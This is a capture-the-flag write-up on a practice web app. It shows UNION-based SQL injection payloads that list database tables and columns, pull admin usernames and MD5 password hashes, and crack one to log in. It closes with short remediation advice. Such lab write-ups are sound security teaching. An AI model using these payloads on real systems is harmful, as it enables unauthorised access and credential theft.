## How we found the flag

- By doing sql inject on the memebers page (/index.php?page=member), we can find the database table schema, including table schema names, table names and column names.

- First, we can find out database with `1 UNION SELECT 1, version() limit 1,1`, the DB version is `5.5.64-MariaDB-1ubuntu0.14.04.1`.

- We are interested in finding tables containing user password.

- INFORMATION_SCHEMA provides access to database metadata (mysql), see [doc](https://dev.mysql.com/doc/refman/8.3/en/information-schema-table-reference.html).

- Get all the table name with their column names with `-1 UNION SELECT table_name, column_name FROM information_Schema.columns`

- Search "pass" on the result page, we now know that table "db_default" has a "password" column
```
ID: -1 UNION SELECT table_name, column_name FROM information_Schema.columns 
First name: db_default
Surname : password
```
We also have the "username" column in table "db_default"
```
ID: -1 UNION SELECT table_name, column_name FROM information_Schema.columns 
First name: db_default
Surname : username
```

- If we try `-1 UNION SELECT username, password from db_default`, we get this output:
```
Table 'Member_Sql_Injection.db_default' doesn't exist
```
This means "db_default" is not inside the "Member_Sql_Injection" schema.
- We can get its schema name with `-1 UNION SELECT table_schema, table_name FROM information_Schema.tables`, search "db_default", output:
```
ID: -1 UNION SELECT table_schema, table_name FROM information_Schema.tables 
First name: Member_Brute_Force
Surname : db_default
```

- Then with `-1 UNION SELECT username,password FROM Member_Brute_Force.db_default`, we get:
```
ID: -1 UNION SELECT username,password FROM Member_Brute_Force.db_default 
First name: root
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8

ID: -1 UNION SELECT username,password FROM Member_Brute_Force.db_default 
First name: admin
Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
```

- Decrypt "3bf1114a986ba87ed28fc1b5884fc2f8" with https://www.dcode.fr/cipher-identifier, the most likly algorithm is MD5, the decrypted value is "shadow".

- Sign in with
```
username: "admin" or "root"
password: shadow
```
to get the flag

## How to exploit the breach
- We can now access the website with an admin account.

## What's the correct way
- Enforce input validation to prevent sql injection
- Limit user privileges on sensitive tables
- Use a stronger, or double encrytion method for storing password or other sensitive information